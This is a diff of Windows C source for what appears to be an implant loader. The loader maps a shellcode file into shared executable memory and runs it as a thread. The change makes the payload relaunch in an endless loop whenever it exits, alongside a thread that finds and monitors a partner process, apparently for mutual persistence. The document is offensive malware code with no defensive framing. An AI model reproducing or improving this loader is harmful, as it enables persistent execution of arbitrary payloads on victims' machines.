@@ -162,17 +162,21 @@ CLEANUP:
 	return retVal;
 }
 
-int runPayload(char* payloadData, HANDLE* implantHandle){
+int runPayload(char* payloadData){
 	DPRINT("runPayload\n");
 
 	int retVal = 0;
+	HANDLE implantHandle = NULL;
 
-	*implantHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payloadData, NULL, 0, 0);
-	Sleep(1000); // Wait a bit for the thread to kick off
-	CHECK_RETVAL_GLE(retVal, "CreateThread", *implantHandle, NULL);
+	while(TRUE){
+		implantHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payloadData, NULL, 0, 0);
+		CHECK_RETVAL_GLE(retVal, "CreateThread", implantHandle, NULL);
+		DPRINT("New Payload\n");
+		WaitForSingleObject(implantHandle, INFINITE);
+	}
 
-	DPRINT("Success\n");
 CLEANUP:
+	SAFE_CLOSEHANDLE(implantHandle);
 	return retVal;
 }
 
@@ -234,7 +238,6 @@ int main(){
 					SET_RETVAL(retVal, "main", 999); // TODO: This is dirty. Try again.
 			}
 
-			DPRINT("Open the shellcode file\n");
 			// Open the shellcode file
 			// TODO: Add code to attempt to get an exclusive handle to protect the file
 			shellcodeFile = CreateFileW(
@@ -247,7 +250,6 @@ int main(){
 				NULL);
 			CHECK_RETVAL_GLE(retVal, "CreateFileW", shellcodeFile, INVALID_HANDLE_VALUE);
 
-			DPRINT("Create a named file mapping for IPC\n");
 			shellcodeMap = CreateFileMappingW(
 				shellcodeFile,
 				NULL,
@@ -275,7 +277,6 @@ int main(){
 				monitorHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)findAndMonitorPartner, NULL, 0, 0);
 				CHECK_RETVAL_GLE(retVal, "CreateThread", monitorHandle, NULL);
 
-				DPRINT("Open named file mapping\n");
 				shellcodeMap = OpenFileMappingW(
 					FILE_MAP_READ | FILE_MAP_EXECUTE,
 					FALSE,
@@ -283,17 +284,16 @@ int main(){
 				);
 				CHECK_RETVAL_GLE(retVal, "OpenFileMappingW", shellcodeMap, NULL);
 
-				DPRINT("Map a view into memory\n");
 				shellcodeView = MapViewOfFile(
 					shellcodeMap,
-					FILE_MAP_READ | FILE_MAP_EXECUTE,//FILE_MAP_READ,
+					FILE_MAP_READ | FILE_MAP_EXECUTE,
 					0,
 					0,
 					0
 				);
 				CHECK_RETVAL_GLE(retVal, "MapViewOfFile", shellcodeView, NULL);
 
-				retVal = runPayload((char*) shellcodeView, &implantHandle);
+				implantHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runPayload, (char*) shellcodeView, 0, 0);// runPayload((char*) shellcodeView, &implantHandle);
 				CHECK_RETVAL(retVal, runPayload);
 
 				DPRINT("Orchestrate\n");
@@ -303,11 +303,9 @@ int main(){
 				waitResult = WaitForSingleObject(monitorHandle, INFINITE);
 
 		} else{
-			retVal = 999; // Something is wrong. Abort.
-			goto CLEANUP;
+			SET_RETVAL(retVal, "Main", UNKNOWN_ERROR);
 		}
 	}
-	// Telephony service, errorcommand
 
 CLEANUP:
 	SAFE_CLOSEHANDLE(shellcodeFile);
